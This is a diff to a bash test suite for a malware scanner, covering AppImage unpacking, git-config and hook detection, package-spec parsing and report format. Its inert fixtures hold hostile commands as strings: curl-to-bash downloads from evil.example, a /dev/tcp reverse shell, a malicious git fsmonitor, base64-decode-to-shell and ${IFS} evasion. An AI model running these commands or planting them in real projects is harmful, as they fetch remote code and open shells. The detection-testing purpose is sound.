@@ -3,7 +3,7 @@
 # main script is not run) plus integration tests over inert fixtures. Offline and
 # deterministic: no network, no LLM, fixtures never execute (dangerous lines are
 # quoted strings or behind SystemExit guards).
-# MODE and ASAR_PASS are read by the functions sourced below, not by this file.
+# MODE and EMBED_PASS are read by the functions sourced below, not by this file.
 # shellcheck disable=SC2034
 set -uo pipefail
 
@@ -18,6 +18,10 @@ eq()   { [[ "$2" == "$3" ]] && pass "$1" || fail "$1 (want '$3' got '$2')"; }
 
 # --- unit: source individual functions without running main -------------------
 eval "$(sed -n '/^extract_url()/,/^}/p'         "$SC")"
+# is_appimage before classify_input, which calls it: sourced individually, a
+# missing helper is not an error, it is a silent "command not found" and a
+# classify_input that quietly takes the wrong branch.
+eval "$(sed -n '/^is_appimage()/,/^}/p'         "$SC")"
 eval "$(sed -n '/^classify_input()/,/^}/p'      "$SC")"
 eval "$(sed -n '/^sev_rank()/,/^}/p'            "$SC")"
 eval "$(sed -n '/^more_severe()/,/^}/p'         "$SC")"
@@ -49,6 +53,12 @@ eq "script URL -> installer"    "$(classify_input 'https://x.io/install.sh')" "i
 eq "git URL -> repo"            "$(classify_input 'https://github.com/u/repo.git')" "repo"
 eq "github repo URL -> repo"    "$(classify_input 'https://github.com/u/repo')" "repo"
 eq "raw .sh URL -> installer"   "$(classify_input 'https://raw.githubusercontent.com/u/r/main/install.sh')" "installer"
+# a container handed in directly is a tree to unpack, not a source file to read
+ciap=$(mktemp); printf '\177ELF\002\001\001\000AI\002' > "$ciap"
+eq "AppImage -> repo"           "$(classify_input "$ciap")" "repo"
+printf '#!/bin/sh\necho hi\n' > "$ciap"
+eq "plain script stays a file"  "$(classify_input "$ciap")" "file"
+rm -f "$ciap"
 
 echo "unit: extract_url"
 eq "url from curl cmd" "$(extract_url 'curl -fsSL https://x.io/i.sh | bash')" "https://x.io/i.sh"
@@ -58,7 +68,7 @@ eq "DANGEROUS beats CAUTION" "$(more_severe CAUTION DANGEROUS)" "DANGEROUS"
 eq "CAUTION beats SAFE"      "$(more_severe SAFE CAUTION)" "CAUTION"
 
 echo "unit: demote_for_mode (anti-cry-wolf)"
-ASAR_PASS=0
+EMBED_PASS=0
 MODE=installer
 eq "persistence demoted to LOW"   "$(demote_for_mode persistence MED)" "LOW"
 eq "download-exec HIGH -> MED"    "$(demote_for_mode download-exec HIGH)" "MED"
@@ -71,12 +81,12 @@ eq "pkgcheck keeps install-hook"       "$(demote_for_mode install-hook HIGH)" "H
 MODE=repo
 # inside a built app bundle: install-time and credential-path tags are noise,
 # runtime-behaviour tags are not
-ASAR_PASS=1
+EMBED_PASS=1
 eq "asar demotes secret-scrape"        "$(demote_for_mode secret-scrape MED)" "LOW"
 eq "asar demotes install-hook"         "$(demote_for_mode install-hook HIGH)" "LOW"
 eq "asar keeps reverse-shell"          "$(demote_for_mode reverse-shell HIGH)" "HIGH"
 eq "asar demotes import-shadow"        "$(demote_for_mode import-shadow CRIT)" "LOW"
-ASAR_PASS=0
+EMBED_PASS=0
 # ...but in a source tree, which is what the clone and pip hooks actually scan,
 # a compiled module beside a same-named .py stays the ChocoPoC signal
 eq "source tree keeps import-shadow"   "$(demote_for_mode import-shadow CRIT)" "CRIT"
@@ -169,7 +179,7 @@ echo "hook: install trigger routing (which subcommands scan, and with what args)
 # [Y/n] prompt auto-proceeds, so this exercises routing without a pty.
 trh=$(mktemp -d)
 printf '#!/bin/sh\nprintf "SCAN %%s\\n" "$*"\n' >"$trh/sc"; chmod +x "$trh/sc"
-for m in npm yarn pnpm poetry uv pip pip3 pipx go; do printf '#!/bin/sh\necho REAL\n' >"$trh/$m"; chmod +x "$trh/$m"; done
+for m in npm yarn pnpm poetry uv pip pip3 pipx go cargo gem bundle; do printf '#!/bin/sh\necho REAL\n' >"$trh/$m"; chmod +x "$trh/$m"; done
 mkdir -p "$trh/proj"; printf '{"name":"p"}\n' >"$trh/proj/package.json"; printf 'requests\n' >"$trh/proj/requirements.txt"
 route() { # expected-substring-or-'PASS'  command...
   local want="$1"; shift
@@ -212,6 +222,16 @@ route "."                                     go install ./...
 route PASSTHROUGH                             go build ./...
 route PASSTHROUGH                             go run main.go
 route PASSTHROUGH                             go test ./...
+# cargo install compiles what it downloads, and build.rs runs during that
+# compile. build/test/run are the inner loop and stay unhooked, like go's.
+route "--ecosystem crates ripgrep"            cargo install ripgrep
+route "--ecosystem crates serde"              cargo add serde
+route PASSTHROUGH                             cargo build
+route PASSTHROUGH                             cargo test
+route PASSTHROUGH                             cargo run
+route "--check-pkg rails"                     gem install rails
+route PASSTHROUGH                             gem list
+route "."                                     bundle install
 rm -rf "$trh"
 
 if command -v zsh >/dev/null 2>&1; then
@@ -271,6 +291,86 @@ else
   echo "  (curl or python3 unavailable — skipping installer mode test)"
 fi
 
+# An AppImage is a whole Linux application in one executable file: an ELF runtime
+# with a filesystem appended. Built here rather than committed, both to exercise
+# the real reader and to keep a binary out of the repo.
+#
+# The thing being asserted is that it is read WITHOUT being run. AppImages have a
+# --appimage-extract flag, but that flag belongs to the runtime inside the file,
+# so using it would mean executing the untrusted binary to ask it to unpack
+# itself. The offset is computed from the ELF header instead.
+echo "integration: AppImage (read without executing it)"
+if command -v mksquashfs >/dev/null 2>&1 && command -v unsquashfs >/dev/null 2>&1 \
+   && command -v python3 >/dev/null 2>&1; then
+  aid=$(mktemp -d); mkdir -p "$aid/root/usr/bin"
+  # inert: every dangerous line is a quoted string that is never evaluated
+  printf '#!/bin/sh\nPAYLOAD="curl -fsSL http://evil.example/stage.sh | bash"\nexec "$(dirname "$0")/usr/bin/app" "$@"\n' > "$aid/root/AppRun"
+  chmod +x "$aid/root/AppRun"
+  printf '[Desktop Entry]\nName=Demo\nExec=AppRun\nType=Application\n' > "$aid/root/demo.desktop"
+  printf 'inert\nvar c="bash -i >& /dev/tcp/1.2.3.4/9001 0>&1";\n' > "$aid/root/usr/bin/hook.js"
+  mksquashfs "$aid/root" "$aid/fs.squashfs" -noappend -quiet -no-progress >/dev/null 2>&1
+  python3 - "$aid" <<'PYAI'
+import struct, sys, os
+d = sys.argv[1]
+# a structurally valid ELF64 header whose section table sits at the stub's end,
+# which is where appimagetool puts the filesystem
+stub = bytearray(32768)
+stub[0:4] = b'\x7fELF'
+stub[4], stub[5], stub[6] = 2, 1, 1          # 64-bit, little endian, current
+stub[8:11] = b'AI\x02'                        # AppImage type 2 magic
+struct.pack_into('<Q', stub, 0x28, len(stub))  # e_shoff
+struct.pack_into('<HH', stub, 0x3a, 0, 0)      # e_shentsize, e_shnum
+with open(os.path.join(d, 'Demo-x86_64.AppImage'), 'wb') as f:
+    f.write(bytes(stub))
+    f.write(open(os.path.join(d, 'fs.squashfs'), 'rb').read())
+os.chmod(os.path.join(d, 'Demo-x86_64.AppImage'), 0o755)
+PYAI
+  aij="$("$SC" --offline --json "$aid/Demo-x86_64.AppImage" 2>/dev/null)"
+  aitags="$(printf '%s' "$aij" | python3 -c 'import json,sys;print(" ".join(sorted({f["tag"] for f in json.load(sys.stdin)["findings"]})))' 2>/dev/null)"
+  aifiles="$(printf '%s' "$aij" | python3 -c 'import json,sys;print(" ".join(f["file"] for f in json.load(sys.stdin)["findings"]))' 2>/dev/null)"
+  [[ "$aitags" == *"reverse-shell"* ]] && pass "scans code inside the AppImage" || fail "AppImage contents not scanned (tags: $aitags)"
+  [[ "$aifiles" == *".AppImage!/"* ]] && pass "reports findings against the AppImage path" || fail "AppImage path label missing"
+  [[ "$aitags" != *"appimage-unread"* ]] && pass "AppImage unpacked cleanly" || fail "AppImage reported unreadable"
+  # AppRun has no extension, and is the one file in an AppImage guaranteed to run
+  [[ "$aifiles" == *"!/AppRun"* ]] && pass "AppRun is scanned despite having no extension" || fail "AppRun not scanned"
+  # a file that only looks like one must not be reported as unreadable, or every
+  # ordinary executable in a tree becomes a finding
+  printf '#!/bin/sh\necho hi\n' > "$aid/plain.sh"; chmod +x "$aid/plain.sh"
+  head -c 40000 /dev/zero > "$aid/notanappimage.bin"; chmod +x "$aid/notanappimage.bin"
+  ajs="$("$SC" --offline --json "$aid" 2>/dev/null | python3 -c '
+import json,sys
+print(" ".join(sorted({f["tag"] for f in json.load(sys.stdin)["findings"]})))' 2>/dev/null)"
+  [[ "$ajs" != *"appimage-unread"* ]] && pass "ordinary executables are not mistaken for AppImages" || fail "false appimage-unread on plain files"
+  rm -rf "$aid"
+else
+  echo "  (mksquashfs/unsquashfs/python3 unavailable — skipping AppImage test)"
+fi
+
+# `eval "$(cmd)"` is how you load an environment, not how you hide a payload.
+# Ubuntu ships `eval $(/usr/bin/locale-check C.UTF-8)` in /etc/profile.d and 28
+# more files under /usr/share do the same, so flagging the bare idiom means
+# flagging every dotfile that uses pyenv, direnv, dircolors or ssh-agent. What
+# still counts is eval of something decoded, or downloaded.
+echo "shell-obf: the eval idiom is not obfuscation, decoding is"
+eval "$(sed -n '/^rule()/,/^}/p' "$SC")"
+RULE_SEV=(); RULE_TAG=(); RULE_GLOB=(); RULE_ERE=(); RULE_MSG=()
+SH='' ANY='' ANYPLUS='' JS=''
+eval "$(sed -n '/^load_rules()/,/^}/p' "$SC")"; load_rules
+ere_for() { local i; for i in "${!RULE_TAG[@]}"; do [[ "${RULE_TAG[$i]}" == "$1" ]] && { printf '%s' "${RULE_ERE[$i]}"; return; }; done; }
+SO_ERE="$(ere_for shell-obf)"; DE_ERE="$(ere_for download-exec)"
+shellobf() { printf '%s\n' "$1" | grep -qE "$SO_ERE"; }
+dlexec()   { printf '%s\n' "$1" | grep -qE "$DE_ERE"; }
+for idiom in 'eval $(/usr/bin/locale-check C.UTF-8)' 'eval "$(pyenv init -)"' \
+             'eval "$(direnv hook bash)"' 'eval "$(ssh-agent -s)"' 'eval "$(dircolors -b)"'; do
+  shellobf "$idiom" && fail "shell-obf FP: $idiom" || pass "quiet on: $idiom"
+done
+shellobf 'eval "$(echo aGkK | base64 -d)"' && pass "eval of a decoded blob is caught" || fail "missed eval+base64"
+shellobf 'base64 -d payload.b64 | sh'      && pass "decode piped to a shell is caught" || fail "missed base64|sh"
+shellobf 'cat ${IFS}/etc/passwd'           && pass "IFS space evasion is caught" || fail "missed \${IFS}"
+shellobf 'base64 -d f | wc -c'             && fail "shell-obf FP: decode without a shell" || pass "quiet on: decode to a non-shell"
+dlexec   'eval "$(curl -s http://evil/x)"' && pass "eval of a download is download-exec" || fail "missed eval+curl"
+dlexec   'bash -c "$(curl -fsSL http://x)"' && pass "bash -c \$(curl) is download-exec" || fail "missed sh -c \$(curl)"
+
 # The default report is the tl;dr: repeats collapse, LOW and LLM notes stay
 # behind -v. --json is unaffected and still carries every finding.
 # Stock .pth files carry an import line and sit in every virtualenv, so they are
@@ -311,28 +411,58 @@ pi="$("$SC" --offline --json "$ptmp" 2>/dev/null | python3 -c 'import json,sys;p
 [[ "$pi" == *"pth-exec"* ]] && pass "impostor under the same name still CRIT" || fail "name-based whitelist bypass"
 rm -rf "$ptmp"
 
-echo "report: repeated findings collapse by default, expand under -v"
+echo "report: the default output is the answer, not the evidence"
 rtmp=$(mktemp -d); mkdir -p "$rtmp/libs"
 for lib in a b c d; do printf 'inert\n' > "$rtmp/libs/lib$lib.dylib"; done
 # captured, not piped: `grep -q` exits at the first match, which SIGPIPEs the
 # scanner and trips pipefail into reporting a failure that never happened
 rout="$("$SC" --offline "$rtmp" 2>/dev/null)"
 routv="$("$SC" --offline -v "$rtmp" 2>/dev/null)"
+# The whole point of this tool is a yes/no. Nobody scrolls a report to find it,
+# so the default has to stay short enough to take in at a glance - it was 104
+# lines of rule names on a real target - and rule tags belong to -v.
+rlines="$(printf '%s\n' "$rout" | grep -c .)"
+[[ "$rlines" -le 6 ]] && pass "default report is $rlines lines" || fail "default report too long ($rlines lines)"
 rc="$(printf '%s\n' "$rout"  | grep -c 'native-vendored')"
 rv="$(printf '%s\n' "$routv" | grep -c 'native-vendored')"
-eq "4 identical findings print once" "$rc" "1"
-eq "-v prints all 4"                 "$rv" "4"
-[[ "$rout" == *"(+3 more files)"* ]] \
-  && pass "collapsed line names the file count" || fail "no file count on collapsed line"
+eq "tag names do not appear by default" "$rc" "0"
+eq "-v lists every occurrence"          "$rv" "4"
+[[ "$routv" == *"(+3 more files)"* ]] \
+  && pass "-v collapses repeats and names the file count" || fail "no file count on collapsed line"
 rj="$("$SC" --offline --json "$rtmp" 2>/dev/null | python3 -c 'import json,sys;print(len(json.load(sys.stdin)["findings"]))')"
 eq "--json keeps all 4" "$rj" "4"
 rm -rf "$rtmp"
 
-echo "report: SAFE omits the findings-count line; non-SAFE includes it"
+# The summary is only useful if every rule that can drive a verdict has a
+# consequence to state. A new MED+ rule with no mapping would silently render as
+# "Other behaviour worth reading", which is the tag-name problem again.
+echo "report: every verdict-driving tag maps to a stated harm"
+eval "$(sed -n '/^harm_group()/,/^}/p' "$SC")"
+unmapped=""
+while read -r t; do
+  [[ -z "$t" ]] && continue
+  [[ "$(harm_group "$t")" == "other" ]] && unmapped="$unmapped $t"
+done < <({ grep -oE '^  rule (MED|HIGH|CRIT) +[a-z0-9-]+' "$SC" | awk '{print $3}'
+           grep -oE 'add_finding (MED|HIGH|CRIT) [a-z0-9-]+' "$SC" | awk '{print $3}'
+           grep -oE 'emit\("(MED|HIGH|CRIT)", "[a-z0-9-]+"' "$HERE/sanitycheck_deep.py" \
+             | sed -E 's/.*"([a-z0-9-]+)"$/\1/'; } | sort -u)
+eq "no MED+ tag falls back to 'other'" "${unmapped:-none}" "none"
+
+echo "report: verdict first, and phrased as consequences"
 rs="$("$SC" --offline "$FIX/benign-poc" 2>/dev/null)"
-[[ "$rs" == *"VERDICT: SAFE"* && "$rs" != *"findings:"* ]] && pass "SAFE report has no findings: line" || fail "SAFE report shape"
+[[ "$rs" == *"[+] SAFE"* && "$rs" != *"finding"* ]] \
+  && pass "SAFE says so and stops" || fail "SAFE report shape"
 rd="$("$SC" --offline "$FIX/chocopoc-lookalike" 2>/dev/null)"
-[[ "$rd" == *"findings:"* && "$rd" == *"VERDICT: DANGEROUS"* ]] && pass "DANGEROUS report has findings: line" || fail "DANGEROUS report shape"
+[[ "$rd" == *"[!] DANGEROUS - execution not advised"* ]] \
+  && pass "DANGEROUS leads with the verdict" || fail "DANGEROUS report shape"
+# the summary line has to say what it would do to you, not which rule matched
+[[ "$rd" == *"matches known malware"* && "$rd" == *"steals credentials"* ]] \
+  && pass "summary is in consequences, not tag names" || fail "summary not in consequences: $rd"
+[[ "$rd" != *"import-shadow"* && "$rd" != *"ioc-pkg"* ]] \
+  && pass "no rule tags in the default report" || fail "rule tags leaked into the default report"
+# the verdict must come before any detail, not after it
+rdfirst="$(printf '%s\n' "$rd" | grep -n 'DANGEROUS' | head -1 | cut -d: -f1)"
+[[ "${rdfirst:-99}" -le 3 ]] && pass "verdict is in the first 3 lines" || fail "verdict buried at line $rdfirst"
 
 # Regression for the git-clone-scan-death bug: with the progress spinner active
 # (needs a tty) a scan longer than one spinner sweep used to die under set -e
@@ -347,7 +477,7 @@ if command -v script >/dev/null 2>&1; then
   else                                                # BSD/macOS
     SANITYCHECK_SPIN_INTERVAL=0.001 script -q "$ptylog" "$SC" --offline "$FIX/chocopoc-lookalike" >/dev/null 2>&1
   fi
-  grep -q "VERDICT: DANGEROUS" "$ptylog" && pass "verdict printed with spinner active" || fail "spinner death: no verdict under pty"
+  grep -q "DANGEROUS - execution not advised" "$ptylog" && pass "verdict printed with spinner active" || fail "spinner death: no verdict under pty"
   grep -q "auditing" "$ptylog" && pass "spinner actually ran" || fail "spinner never rendered (test not exercising the path)"
   rm -f "$ptylog"
 else
@@ -466,7 +596,10 @@ print(d["verdict"])
 for f in sorted(d["findings"], key=lambda x:(x["tag"],x["file"],x["line"])):
     print(f["severity"], f["tag"], f["file"], f["line"])'
   }
-  for efx in chocopoc-lookalike dev-targeting malware-2026; do
+  # autorun-2026 and false-positives matter here specifically: they add a new
+  # glob (*.ipynb) and live largely in hidden directories (.cargo, .devcontainer,
+  # .github), which is exactly what rg's defaults would have skipped.
+  for efx in chocopoc-lookalike dev-targeting malware-2026 autorun-2026 false-positives; do
     if [[ "$(edump grep "$efx")" == "$(edump rg "$efx")" ]]; then
       pass "identical findings on $efx"
     else
@@ -476,6 +609,113 @@ for f in sorted(d["findings"], key=lambda x:(x["tag"],x["file"],x["line"])):
 else
   echo "  (rg unavailable — skipping engine-parity test)"
 fi
+
+# Every shape in this fixture is ordinary code from a real project, and every one
+# of them scored non-LOW before: a stdlib urlretrieve() call (HIGH download-exec),
+# tqdm's Telegram progress bar inside a virtualenv (MED exfil-channel), a
+# Cloudflare deploy hook (HIGH ci-secret-exfil), U+200B in a minified bundle (MED
+# invisible-unicode), a Hebrew Qt translation catalogue (HIGH trojan-source) and
+# an embedded cargo runner. Together they took the fixture to DANGEROUS. A
+# scanner that cries wolf on this gets turned off, so the whole set is one test.
+echo "false positives: ordinary real-world code stays SAFE"
+scan false-positives; eq "verdict" "$VERDICT" "SAFE"; eq "exit" "$EXIT" "0"
+expect_no_tag download-exec
+expect_no_tag ci-secret-exfil
+expect_no_tag invisible-unicode
+expect_no_tag trojan-source
+
+echo "integration: autorun-2026 -> DANGEROUS (notebook, devcontainer, cargo, URL dep)"
+scan autorun-2026; eq "verdict" "$VERDICT" "DANGEROUS"; eq "exit" "$EXIT" "1"
+for t in download-exec devcontainer-exec cargo-runner dep-url; do has "$t"; done
+
+# A .git directory travels with a working tree copied from a share or restored
+# from a zip, and git runs several config values as commands. It cannot be a
+# committed fixture (git will not track a nested .git), so it is built here.
+echo "git: a handed-over .git runs code; git-lfs and husky do not"
+gtd=$(mktemp -d)
+mkdir -p "$gtd/lfs/.git" "$gtd/hostile/.git" "$gtd/hooks/.git/hooks"
+printf '[filter "lfs"]\n\tclean = git-lfs clean -- %%f\n\tsmudge = git-lfs smudge -- %%f\n[core]\n\tfsmonitor = true\n\tsshCommand = ssh -i ~/.ssh/id_work\n' > "$gtd/lfs/.git/config"
+printf '[core]\n\tfsmonitor = "curl -s http://evil.example/x | sh"\n' > "$gtd/hostile/.git/config"
+printf '#!/bin/sh\nnpx lint-staged\n' > "$gtd/hooks/.git/hooks/pre-commit"
+printf '#!/bin/sh\ncurl -s http://evil.example/b | bash\n' > "$gtd/hooks/.git/hooks/post-checkout"
+chmod +x "$gtd/hooks/.git/hooks/pre-commit" "$gtd/hooks/.git/hooks/post-checkout"
+gjson() { "$SC" --offline --json "$1" 2>/dev/null | python3 -c '
+import json,sys
+d=json.load(sys.stdin)
+print(d["verdict"], " ".join(sorted({f["tag"] for f in d["findings"] if f["severity"]!="LOW"})))'; }
+gl="$(gjson "$gtd/lfs")"
+[[ "$gl" == SAFE* ]] && pass "git-lfs filters + a custom ssh key stay SAFE" || fail "git-lfs FP: $gl"
+gh="$(gjson "$gtd/hostile")"
+[[ "$gh" == *git-config-exec* ]] && pass "fsmonitor set to a downloader is caught" || fail "hostile .git/config missed: $gh"
+gk="$(gjson "$gtd/hooks")"
+[[ "$gk" == *git-hook-exec* ]] && pass "a hook that shells out is caught" || fail "hostile git hook missed: $gk"
+# ...and the ordinary husky hook beside it must not be what raised the verdict
+gkl="$("$SC" --offline --json "$gtd/hooks" 2>/dev/null | python3 -c '
+import json,sys
+print(" ".join(f["severity"] for f in json.load(sys.stdin)["findings"] if f["tag"]=="git-hook"))')"
+eq "benign husky hook stays LOW" "$gkl" "LOW"
+rm -rf "$gtd"
+
+# A package argument is a spec, not a name. Getting this wrong both invented
+# dependency-confusion findings on ordinary pinned installs and let a pinned
+# known-malicious package through the IOC check.
+echo "unit: pkg_basename (package spec -> bare name)"
+eval "$(sed -n '/^pkg_basename()/,/^}/p' "$SC")"
+eq "strips == pin"        "$(pkg_basename 'skytext==1.1.0')" "skytext"
+eq "strips extras"        "$(pkg_basename 'requests[socks]')" "requests"
+eq "strips >= specifier"  "$(pkg_basename 'requests>=2.0')" "requests"
+eq "strips npm @version"  "$(pkg_basename 'lodash@4.17.21')" "lodash"
+eq "keeps npm @scope"     "$(pkg_basename '@scope/pkg')" "@scope/pkg"
+eq "scope + version"      "$(pkg_basename '@scope/pkg@1.2.3')" "@scope/pkg"
+eq "go module @version"   "$(pkg_basename 'github.com/x/y@v1.2.3')" "github.com/x/y"
+eq "local path -> none"   "$(pkg_basename './local')" ""
+eq "vcs url -> none"      "$(pkg_basename 'git+https://e/x.git')" ""
+eq "flag -> none"         "$(pkg_basename '-U')" ""
+# the bug this fixes: the version defeated the IOC comparison
+"$SC" --offline --check-pkg 'skytext==1.1.0' >/dev/null 2>&1
+eq "pinned malicious package still matches the IOC" "$?" "1"
+
+echo "unit: split_spec (helper-side, keeps the pin so the pinned code is scanned)"
+if command -v python3 >/dev/null 2>&1; then
+  ss="$(python3 -c '
+import sys; sys.path.insert(0, "'"$HERE"'")
+from sanitycheck_deep import split_spec
+cases = [("requests==2.31.0","pypi",("requests","2.31.0")), ("requests[socks]","pypi",("requests","")),
+         ("lodash@4.17.21","npm",("lodash","4.17.21")), ("@scope/pkg@1.2.3","npm",("@scope/pkg","1.2.3")),
+         ("github.com/x/y@v1.2.3","go",("github.com/x/y","v1.2.3")), ("./local","pypi",("","")),
+         ("https://e/x.tgz","npm",("","")), ("-U","pypi",("",""))]
+bad = [(s,e,split_spec(s,e),w) for s,e,w in cases if split_spec(s,e) != w]
+print("OK" if not bad else "BAD " + repr(bad))' 2>/dev/null)"
+  eq "all spec shapes split correctly" "$ss" "OK"
+fi
+
+# --json is a machine contract: without python3 it produced no output and exit
+# 127, so a CI gate broke with nothing to read.
+echo "report: --json fails loudly when python3 is missing"
+njd=$(mktemp -d)
+for t in bash sh grep egrep find sed awk tr head tail wc basename dirname mktemp rm cat sort uniq xargs file strings shasum cut sleep kill mkdir cp ln env; do
+  p="$(command -v "$t" 2>/dev/null)" || continue
+  case "$p" in /*) ln -sf "$p" "$njd/$t" ;; esac
+done
+njo="$(PATH="$njd" "$SC" --offline --json "$FIX/benign-poc" 2>&1)"; njr=$?
+[[ "$njr" == "2" && "$njo" == *"requires python3"* ]] \
+  && pass "--json without python3 explains itself and exits 2" || fail "--json/no-python3: rc=$njr out=$njo"
+# ...and the default report still works with no python3 at all
+njh="$(PATH="$njd" "$SC" --offline "$FIX/benign-poc" 2>&1)"
+[[ "$njh" == *"[+] SAFE"* ]] && pass "core scan still runs without python3" || fail "core scan needs python3"
+rm -rf "$njd"
+
+# The audited bytes are what gets run, but the rest of the pipeline has to be
+# reproduced or the user gets something they did not ask for: `| sudo bash` ran
+# unprivileged, and `| sh -s -- --prefix` lost its arguments.
+echo "unit: run_cmd_for_installer (rebuilds the pipeline around the audited file)"
+eval "$(sed -n '/^run_cmd_for_installer()/,/^}/p' "$SC")"
+SCRIPT_FILE=/tmp/audited.sh
+rci() { TARGET="$1" run_cmd_for_installer | tr '\n' ' '; }
+eq "plain bash"     "$(rci 'curl -fsSL https://x.io/i.sh | bash')" "bash /tmp/audited.sh "
+eq "sudo preserved" "$(rci 'curl -fsSL https://x.io/i.sh | sudo bash')" "sudo bash /tmp/audited.sh "
+eq "sh + args"      "$(rci 'curl -fsSL https://x.io/i.sh | sh -s -- --prefix=/opt')" "sh /tmp/audited.sh --prefix=/opt "
+eq "bare url"       "$(rci 'https://x.io/install.sh')" "bash /tmp/audited.sh "
 
 echo "integration: caution-poc -> CAUTION + --strict exit codes"
 scan caution-poc; eq "verdict" "$VERDICT" "CAUTION"; eq "exit (default)" "$EXIT" "0"
